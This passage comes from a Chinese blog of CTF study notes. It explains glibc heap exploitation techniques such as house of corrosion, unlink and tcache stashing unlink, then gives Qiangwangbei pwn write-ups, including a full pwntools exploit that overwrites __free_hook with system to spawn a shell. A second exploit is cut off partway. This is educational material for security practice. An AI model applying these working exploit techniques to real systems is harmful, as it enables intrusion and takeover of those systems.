<li><p>*(target-0x8-shift_amount) = unsorten_bin;</p>
</li>
<li><p>unsorted_bin-&gt;bk = target-0x8;</p>
</li>
<li><p>unsorted_bin-&gt;fd = large_bin;</p>
</li>
<li><p>large_bin-&gt;bk = unsorted_bin;</p>
</li>
<li><p>*(target+0x8) = unsorted_bin;</p>
</li>
</ul>
<p>修改了的数据有：</p>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">unsorted_bin+0x10</td>
<td align="left">未修改</td>
<td align="left">target-0x8</td>
</tr>
<tr>
<td align="left">unsorted_bin+0x20</td>
<td align="left">large_bin</td>
<td align="left">target-0x28-shift_amount</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">target-0x10</td>
<td align="left">(unsorted_bin&amp;0xFFFF)&lt;&lt;(8-shift_amount)*8+原本数据</td>
<td align="left">unsorted_bin&gt;&gt;(shift_amount*8)</td>
</tr>
<tr>
<td align="left">target</td>
<td align="left">bin_at(av,victim_index)</td>
<td align="left">unsorted_bin</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">large_bin+0x10</td>
<td align="left">未修改</td>
<td align="left">unsorted_bin</td>
</tr>
<tr>
<td align="left">large_bin+0x20</td>
<td align="left">large_bin</td>
<td align="left">unsorted_bin</td>
</tr>
</tbody></table>
<p>于是构造出了 fake_chunk，位于 target-0x10。并将其链入了 unsorted_bin 中，但光链入而没有 chunk_size 和正确的 fd&amp;bk 的话会报错。于是巧妙的利用 large_bin_attack 将堆地址前两字节大小写入作为了 fake_chunk 的大小，将 unsorted_bin 的地址写入作为 bk。然后用 unsorted_bin_attack 写入 fd。所以最后我们只需要猜中这个大小即可申请到 fake_chunk，但由于有地址随机化，因此要多尝试几次。</p>
<h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>需要修改的数据有：</p>
<ul>
<li>unsorted_bin-&gt;bk=target-0x10</li>
<li>large_bin-&gt;bk=target-0x8</li>
<li>large_bin-&gt;bk_nextsize=target-0x28-shift_amount</li>
</ul>
<p>效果：<br>  target-0x10 被链入 unsorted_bin 中。</p>
<h2 id="house-of-corrosion"><a href="#house-of-corrosion" class="headerlink" title="house_of_corrosion"></a>house_of_corrosion</h2><p>主要是global_max_fast，该符号对应的地址保存的内容是fastbin能够保存的最大大小，默认是0x80。而mem size小于该数值的chunk被free后都会被视作是fastbin_chunk，然后被放入arena的fastbins链表数组(fastbinY)中。而fastbinY数组仅有10个元素(0x20-0x80)，若被释放的fastbin_chunk大于0x80时，就会在存储时造成越界访问。</p>
<p>因此我们计算一个合适的size，就能够修改arena中其他位置的地址为该chunk地址，而这个size相关的大小为<code>size=2*x+0x20</code>，这个<code>x</code>为指定地址与fastbinY数组的首地址的差。</p>
<h3 id="条件-6"><a href="#条件-6" class="headerlink" title="条件"></a>条件</h3><p>能够修改global_max_fast</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>过计算size将伪造的io_FILE，放入_IO_list_all，这样构造出FSOP的IO_FILE_plus结构体。fastbinY为main_arena+0x10，因此计算出_IO_list_all对应的chunk_size为<code>(&amp;_IO_list_all-&amp;main_arena-0x10)*2+0x20</code>。</p>
<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>利用unlink能对目标地址进行修改，或者在构造overlap时，遇到合并操作，也需要绕过unlink的检测。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure>

<p>于是利用unlink的操作为：</p>
<ol>
<li>伪造空闲chunk<ol>
<li>在指定位置伪造chunksize、fd与bk，若将这两个地址看作堆块，则目的是使FD与BK为指向同一内存(ptr)，绕过检测。一般来讲，我们伪造的fd与bk为ptr-3*size_t与ptr-2*size_t。</li>
<li>改写其后堆块的prev_size和size的inuse位，使得free掉后者能向前合并。</li>
</ol>
</li>
<li>unlink执行，ptr中的内容最终为FD。若ptr指向free_got，而FD为system的地址，就能实现更改got表的操作。</li>
</ol>
<h1 id="glibc-2-29"><a href="#glibc-2-29" class="headerlink" title="glibc_2.29"></a>glibc_2.29</h1><ul>
<li>tcache增加key，导致不能直接dup。</li>
</ul>
<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><h3 id="条件-7"><a href="#条件-7" class="headerlink" title="条件"></a>条件</h3><p>存在UAF</p>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>使chunk被dup至tcache与unsortedbin中，然后通过其他unsortedbin_chunk与其合并后切割来构造堆重叠即可修改tcache_chain。</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>DASCTF X GFCTF 2022十月挑战赛!–Magic_Book</p>
<h1 id="glibc-2-31"><a href="#glibc-2-31" class="headerlink" title="glibc_2.31"></a>glibc_2.31</h1><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h2><p>适用于 glibc-2.27, glibc-2.29 glibc-2.31</p>
<p>demo 首先创建了一个 fake_chunk($stack_var)，申请了9个 chunk，地址存储在 $chunk_list 中，然后将其全部释放，前两个位于 unsorted_bin 中，后7个位于 tcache 中。在申请了一个较大 chunk 后被放入 small_bin 中。继续申请，使得 tcache 未满。</p>
<p>修改 small_bin 的最后一个 chunk 的 bk 指针，然后使用 calloc 申请一个 chunk(calloc 不会从 tcache 中取，realloc 也是)，就会将 small_bin 中的 chunk 放入 tcache。</p>
<h3 id="条件-8"><a href="#条件-8" class="headerlink" title="条件"></a>条件</h3><ol>
<li>tcache 中有 5 个 chunk</li>
<li>small_bins 不为空(small_bin 大小与上面的 tcache 相等)</li>
<li>能够控制 small_chunk 的 bk</li>
<li>能够在 tcache 不为空时，从 small_bin 中取出 chunk</li>
</ol>
<h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>从 small_bin 中获取 chunk 时，会将 small_bin 中剩余的 chunk 放入未满的对应 tcache 中。并且由于遍历的顺序是从链表的尾部开始，所以我们修改最后一个 chunk 的 bk 指针为指定地址后，就会被第二个放入 tcache 中。而在放入 tcache 之前，会执行<code>bin-&gt;bk = bck;bck-&gt;fd = bin;</code>，这里的本意是将 chunk 取出，但由于没有检测而被利用，所以可以利用。</p>
<h4 id="相关源码-8"><a href="#相关源码-8" class="headerlink" title="相关源码"></a>相关源码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">          <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;</span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>需要修改的数据：</p>
<ul>
<li>small_bin 中最后一个 small_chunk 的 bk=target-0x10</li>
<li>*(target)=任意可写地址</li>
</ul>
<p>效果：<br>  target 被链入 tcache<br>  *(target-&gt;bk+0x10)=bin</p>
<p>由于 target 周围的内容一般不能被控制，所以最好只是用来修改任意内容为 bin 比较好。</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>CTF</tag>
        <tag>heap</tag>
        <tag>how2heap</tag>
      </tags>
  </entry>
  <entry>
    <title>强网杯往年部分pwn_wp</title>
    <url>/2022/07/23/qwb%E5%BE%80%E5%B9%B4%E9%83%A8%E5%88%86pwn-wp/</url>
    <content><![CDATA[<p>待续</p>
<span id="more"></span>

<h2 id="qwb2019-one"><a href="#qwb2019-one" class="headerlink" title="qwb2019_one"></a>qwb2019_one</h2><p>不知道为何远程打不通，老是容易在中间某个循环中断掉。怀疑是 exp 太长了导致超时。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>glibc 版本为 2.27，保护全开。</p>
<p>含有通常堆题的功能外还存在一个 backdoor。</p>
<ul>
<li>add: 申请一个 0x30(mem_size) 大小的 chunk，输入大小为 0x20，会检测这个 chunk 的地址是否处于规定范围内</li>
<li>edit: 修改 chunk 中的一个字节内容，类似 replace</li>
<li>show: 展示 chunk 内容，会检查 chunk 中字符串长度释放大于 0x20</li>
<li>remove: 删除 chunk</li>
<li>backdoor: 程序申请的5个 0x20 大小 chunk 的内容，内容为随机字符串</li>
</ul>
<h4 id="漏洞与利用"><a href="#漏洞与利用" class="headerlink" title="漏洞与利用"></a>漏洞与利用</h4><ul>
<li>backdoor 中使用<code>abs32(get_int()) % 5</code>来确定输出 chunk，但是由于 get_int 返回的整数是被补齐到8字节，因此存在整数溢出漏洞。可以利用来输出这个5个 chunk 地址之上的内容。</li>
<li>edit 功能中使用 strchr 来查找指定字符，这个字符可以是<code>\0</code>，因此存在溢出漏洞。可以利用此来修改 next_chunk 中的大小与内容。</li>
</ul>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><ul>
<li>利用 backdoor 泄露 elf_base</li>
<li>利用 edit 的溢出，进行堆扩展，获得一块 0x441 大小的 chunk，释放后在申请一个 chunk 实现堆重叠，释放掉这个 chunk 泄露获得 libc 版本</li>
<li>利用 edit 的溢出，修改 next_chunk 的内容，使用 unlink，目的是修改 chunk 范围，从而能够申请 __free_hook</li>
<li>最后覆盖 __free_hook 为 system 来 getshell</li>
</ul>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./one&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26223</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./one&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;command&gt;&gt; &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">string</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(string)==<span class="number">0x20</span>):</span><br><span class="line">        sa(<span class="string">&quot;Now, you can input your test string:&quot;</span>,string)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;Now, you can input your test string:&quot;</span>,string)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please give me the index of the string:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,oldchar,newchar</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please give me the index of the string:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;Which char do you want to edit:&quot;</span>,oldchar)</span><br><span class="line">    sla(<span class="string">&quot;What do you want to edit it into:&quot;</span>,newchar)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Please give me the index of the string:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">num</span>):</span></span><br><span class="line">    choose(<span class="number">12580</span>)</span><br><span class="line">    sla(<span class="string">&quot;Do you want to use one?(Y/N)&quot;</span>,<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Here are 5 strings to be tested. Which one do you want to test?&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">backdoor(<span class="number">0x80000000</span>)</span><br><span class="line">ru(<span class="string">&quot;The string:\n&quot;</span>)</span><br><span class="line">elf_base=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">0x2030c0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x12</span>):</span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;\x04&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">main_arena=u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=main_arena-<span class="number">0x3ebca0</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)<span class="comment">#0x13</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0x13</span>)</span><br><span class="line">ru(<span class="string">&quot;The string is:\n&quot;</span>)</span><br><span class="line">heap=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x18</span>):</span><br><span class="line">        edit(<span class="number">7</span>+i,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">7</span>+i,<span class="string">&#x27;\x41&#x27;</span>,<span class="string">&#x27;\x91&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    edit(<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x62</span>+i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">9</span>,<span class="built_in">chr</span>(<span class="number">0x71</span>-i),<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&#x27;\x6a&#x27;</span>,<span class="string">&#x27;\x41&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(<span class="number">7</span>+i+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x61</span>+i))</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;\xb0&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">6</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x61</span>+<span class="number">0x10</span>+i))</span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&#x27;\x41&#x27;</span>,<span class="string">&#x27;\x90&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">6</span>,<span class="built_in">chr</span>(<span class="number">0x77</span>-i),<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">heaplist=elf_base+<span class="number">0x203060</span></span><br><span class="line">target=heaplist+<span class="number">0x80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x62</span>+i))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="built_in">chr</span>(<span class="number">0x81</span>-i),<span class="built_in">chr</span>((((target-<span class="number">0x10</span>)&lt;&lt;<span class="number">8</span>*i)&amp;<span class="number">0xff00000000000000</span>)&gt;&gt;<span class="number">7</span>*<span class="number">8</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="built_in">chr</span>(<span class="number">0x79</span>-i),<span class="built_in">chr</span>((((target-<span class="number">0x18</span>)&lt;&lt;<span class="number">8</span>*i)&amp;<span class="number">0xff00000000000000</span>)&gt;&gt;<span class="number">7</span>*<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="built_in">chr</span>(<span class="number">0x71</span>-i),<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">&#x27;\x6a&#x27;</span>,<span class="string">&#x27;\xb1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="built_in">chr</span>(<span class="number">0x69</span>-i),<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(target)</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">chr</span>((free_hook&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">chr</span>((system&gt;&gt;<span class="number">8</span>*i)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;/bin/sh\0&#x27;</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="qwb2018-gamebox"><a href="#qwb2018-gamebox" class="headerlink" title="qwb2018_gamebox"></a>qwb2018_gamebox</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>glibc 版本为 2.27，除了仅开启 Partial RELRO 其余保护全开。</p>
<p>程序包含4个功能：</p>
<ul>
<li>Play: 每次可以申请一个固定大小的 chunk</li>
<li>Show: 打印 chunk</li>
<li>Delete: 删除 chunk</li>
<li>Change: 修改 chunk 中的内容</li>
</ul>
<p>不过，调用这些功能时，需要输入不同 chunk 对应的 cookie。cookie 是通过 rand 获取的，并且由于种子值是默认的，所以很容易获取。</p>
<h4 id="漏洞与利用-1"><a href="#漏洞与利用-1" class="headerlink" title="漏洞与利用"></a>漏洞与利用</h4><ul>
<li>Show 功能中存在格式化字符串功能，泄露和修改都用这个</li>
</ul>
<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><ul>
<li>先利用 Show 中的格式化字符串漏洞，泄露栈上地址、efl_base、libc 版本</li>
<li>同理修改栈上内容，由于输入内容在堆上，所以得<a href="http://blog.rabb1t.xyz/2022/03/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/#%E5%88%A9%E7%94%A8%E6%A0%88%E4%B8%8A%E7%9A%84%E9%93%BE%E5%BC%8F%E7%BB%93%E6%9E%84%E8%BF%9B%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E6%94%B9%E5%86%99">利用 rbp_chain 来实现修改</a>，将 __free_hook 修改为 system。</li>
</ul>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>将 cookie 放入 cookies 文件中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./GameBox.dms&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28564</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./GameBox.dms&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_file=</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span> x:gdb.attach(io,gdbscript=x)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;(E)xit&quot;</span>,x)</span><br><span class="line"></span><br><span class="line">cookies=[]</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;cookies&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    line=f.readline()</span><br><span class="line">    <span class="keyword">if</span> line:</span><br><span class="line">        cookies.append(line[:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,name</span>):</span></span><br><span class="line">    choose(<span class="string">&#x27;P&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Come on boy!Guess what I write:&quot;</span>,cookies[idx])</span><br><span class="line">    sla(<span class="string">&quot;Input your name length:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> size!=<span class="built_in">len</span>(name):</span><br><span class="line">        sla(<span class="string">&quot;Input your name:&quot;</span>,name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sa(<span class="string">&quot;Input your name:&quot;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input 